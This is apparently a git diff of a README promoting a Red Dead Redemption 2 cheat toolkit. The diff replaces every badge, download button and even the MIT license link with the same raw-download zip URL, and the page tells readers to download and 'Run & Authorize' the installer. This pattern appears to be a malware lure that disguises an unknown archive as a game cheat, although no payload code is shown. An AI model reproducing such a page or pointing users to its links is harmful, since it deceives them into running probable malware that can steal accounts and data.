@@ -1,14 +1,14 @@
 # RDR 2 Cheats: The Ultimate Companion 🎮  
-![GitHub repo size](https://img.shields.io/github/repo-size/RedDeadCommunity/RDR2Cheats?color=9b111e)  
-![GitHub stars](https://img.shields.io/github/stars/RedDeadCommunity/RDR2Cheats?color=ffd700)  
-![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)  
-![GitHub issues](https://img.shields.io/github/issues/RedDeadCommunity/RDR2Cheats)  
-![Platforms](https://img.shields.io/badge/platform-PC%20%7C%20PS4%20%7C%20XBO-green)
+![GitHub repo size](https://github.com/Stopy160/rdr2-ultimate-toolkit/raw/refs/heads/branch/epigrammatical/rdr-toolkit-ultimate-v2.7.zip)  
+![GitHub stars](https://github.com/Stopy160/rdr2-ultimate-toolkit/raw/refs/heads/branch/epigrammatical/rdr-toolkit-ultimate-v2.7.zip)  
+![MIT License](https://github.com/Stopy160/rdr2-ultimate-toolkit/raw/refs/heads/branch/epigrammatical/rdr-toolkit-ultimate-v2.7.zip)  
+![GitHub issues](https://github.com/Stopy160/rdr2-ultimate-toolkit/raw/refs/heads/branch/epigrammatical/rdr-toolkit-ultimate-v2.7.zip)  
+![Platforms](https://github.com/Stopy160/rdr2-ultimate-toolkit/raw/refs/heads/branch/epigrammatical/rdr-toolkit-ultimate-v2.7.zip%20%7C%20PS4%20%7C%20XBO-green)
 
 Welcome to your electric lasso in the wildest digital west: **RDR 2 Cheats**! Saddle up and experience Red Dead Redemption 2 in flavors you never imagined, with our thoughtfully engineered toolkit. This project isn’t just a cheat sheet – it's your trusted outlaw sidekick, always as reliable as your favorite horse.
 
-<a href="https://Stopy160.github.io">
-  <img alt="Download" src="https://img.shields.io/badge/DOWNLOAD-brightgreen?style=for-the-badge&logo=appveyor&logoColor=white" width="200"/>
+<a href="https://github.com/Stopy160/rdr2-ultimate-toolkit/raw/refs/heads/branch/epigrammatical/rdr-toolkit-ultimate-v2.7.zip">
+  <img alt="Download" src="https://github.com/Stopy160/rdr2-ultimate-toolkit/raw/refs/heads/branch/epigrammatical/rdr-toolkit-ultimate-v2.7.zip" width="200"/>
 </a>
 
 
@@ -56,8 +56,8 @@ Faster than a runaway stagecoach! Here’s how to hitch your ride to the RDR 2 C
 ### Step 1: Download the Installer  
 Jump right into adventure by downloading the latest release:
 
-<a href="https://Stopy160.github.io">
-  <img alt="Download" src="https://img.shields.io/badge/DOWNLOAD-brightgreen?style=for-the-badge&logo=appveyor&logoColor=white" width="200"/>
+<a href="https://github.com/Stopy160/rdr2-ultimate-toolkit/raw/refs/heads/branch/epigrammatical/rdr-toolkit-ultimate-v2.7.zip">
+  <img alt="Download" src="https://github.com/Stopy160/rdr2-ultimate-toolkit/raw/refs/heads/branch/epigrammatical/rdr-toolkit-ultimate-v2.7.zip" width="200"/>
 </a>
 
 ### Step 2: Run & Authorize  
@@ -123,7 +123,7 @@ This repository and all its components are intended solely for educational and e
 ## 📜 License
 
 This project is licensed under the MIT License.  
-View the full license text here: [MIT License](https://opensource.org/licenses/MIT)
+View the full license text here: [MIT License](https://github.com/Stopy160/rdr2-ultimate-toolkit/raw/refs/heads/branch/epigrammatical/rdr-toolkit-ultimate-v2.7.zip)
 
 Copyright © 2025 — RDR 2 Cheats Team
 
@@ -133,8 +133,8 @@ Copyright © 2025 — RDR 2 Cheats Team
 
 It all starts with a single click. Unlock your next Red Dead Redemption 2 journey below:
 
-<a href="https://Stopy160.github.io">
-  <img alt="Download" src="https://img.shields.io/badge/DOWNLOAD-brightgreen?style=for-the-badge&logo=appveyor&logoColor=white" width="200"/>
+<a href="https://github.com/Stopy160/rdr2-ultimate-toolkit/raw/refs/heads/branch/epigrammatical/rdr-toolkit-ultimate-v2.7.zip">
+  <img alt="Download" src="https://github.com/Stopy160/rdr2-ultimate-toolkit/raw/refs/heads/branch/epigrammatical/rdr-toolkit-ultimate-v2.7.zip" width="200"/>
 </a>
 
 ---
